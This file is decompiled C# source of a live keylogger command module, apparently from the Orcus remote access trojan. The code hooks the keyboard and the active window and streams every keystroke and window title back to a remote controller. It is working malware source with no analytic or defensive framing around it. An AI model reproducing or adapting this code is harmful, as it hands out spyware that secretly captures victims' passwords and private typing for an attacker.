using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using Orcus.Plugins;
using Orcus.Shared.Commands.Keylogger;
using Orcus.Shared.Commands.LiveKeylogger;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities.KeyLogger;

namespace Orcus.Commands.LiveKeylogger;

public class LiveKeyloggerCommand : Command
{
	private KeyboardHook _keyboardHook;

	private ActiveWindowHook _activeWindowHook;

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Invalid comparison between Unknown and I4
		LiveKeyloggerCommunication val = (LiveKeyloggerCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 1)
			{
				throw new ArgumentOutOfRangeException();
			}
			((Command)this).Dispose();
			return;
		}
		Program.AppContext.AsyncOperation.Post(delegate
		{
			if (_keyboardHook == null)
			{
				_keyboardHook = new KeyboardHook();
				_keyboardHook.StringDown += delegate(object sender, StringDownEventArgs e)
				{
					//IL_0031: Unknown result type (might be due to invalid IL or missing references)
					//IL_0032: Unknown result type (might be due to invalid IL or missing references)
					//IL_0033: Unknown result type (might be due to invalid IL or missing references)
					//IL_0038: Unknown result type (might be due to invalid IL or missing references)
					//IL_0039: Unknown result type (might be due to invalid IL or missing references)
					//IL_003c: Unknown result type (might be due to invalid IL or missing references)
					//IL_003e: Unknown result type (might be due to invalid IL or missing references)
					//IL_0045: Unknown result type (might be due to invalid IL or missing references)
					//IL_0047: Unknown result type (might be due to invalid IL or missing references)
					//IL_004d: Expected O, but got Unknown
					//IL_0081: Unknown result type (might be due to invalid IL or missing references)
					if (e.IsChar)
					{
						((Command)this).ResponseBytes((byte)2, Encoding.UTF8.GetBytes(e.Value), connectionInfo);
					}
					else
					{
						Keys val5 = (Keys)e.VCode;
						SpecialKeyType val6 = KeyLoggerService.KeysToSpecialKey(val5);
						KeyLogEntry val7 = (KeyLogEntry)(((int)val6 == 0) ? new StandardKey((Keys)val5, true) : new SpecialKey(val6, true));
						((Command)this).ResponseBytes((byte)3, new Serializer((IEnumerable<Type>)new Type[3]
						{
							typeof(KeyLogEntry),
							typeof(SpecialKey),
							typeof(StandardKey)
						}).Serialize((object)val7), connectionInfo);
					}
				};
				_keyboardHook.StringUp += delegate(object sender, StringDownEventArgs e)
				{
					//IL_000f: Unknown result type (might be due to invalid IL or missing references)
					//IL_0010: Unknown result type (might be due to invalid IL or missing references)
					//IL_0011: Unknown result type (might be due to invalid IL or missing references)
					//IL_0016: Unknown result type (might be due to invalid IL or missing references)
					//IL_0017: Unknown result type (might be due to invalid IL or missing references)
					//IL_001a: Unknown result type (might be due to invalid IL or missing references)
					//IL_001c: Unknown result type (might be due to invalid IL or missing references)
					//IL_0023: Unknown result type (might be due to invalid IL or missing references)
					//IL_0025: Unknown result type (might be due to invalid IL or missing references)
					//IL_002b: Expected O, but got Unknown
					//IL_005f: Unknown result type (might be due to invalid IL or missing references)
					if (!e.IsChar)
					{
						Keys val2 = (Keys)e.VCode;
						SpecialKeyType val3 = KeyLoggerService.KeysToSpecialKey(val2);
						KeyLogEntry val4 = (KeyLogEntry)(((int)val3 == 0) ? new StandardKey((Keys)val2, false) : new SpecialKey(val3, false));
						((Command)this).ResponseBytes((byte)4, new Serializer((IEnumerable<Type>)new Type[3]
						{
							typeof(KeyLogEntry),
							typeof(SpecialKey),
							typeof(StandardKey)
						}).Serialize((object)val4), connectionInfo);
					}
				};
			}
			if (_activeWindowHook == null)
			{
				_activeWindowHook = new ActiveWindowHook();
				_activeWindowHook.ActiveWindowChanged += delegate(object sender, ActiveWindowChangedEventArgs e)
				{
					((Command)this).ResponseBytes((byte)5, Encoding.UTF8.GetBytes(e.Title), connectionInfo);
				};
				_activeWindowHook.RaiseOne();
			}
			_keyboardHook.Hook();
		}, null);
	}

	public override void Dispose()
	{
		((Command)this).Dispose();
		Program.AppContext.AsyncOperation.Post(delegate
		{
			if (_keyboardHook != null)
			{
				_keyboardHook.Dispose();
				_keyboardHook = null;
			}
			if (_activeWindowHook != null)
			{
				_activeWindowHook.Dispose();
				_activeWindowHook = null;
			}
		}, null);
	}

	protected override uint GetId()
	{
		return 24u;
	}
}
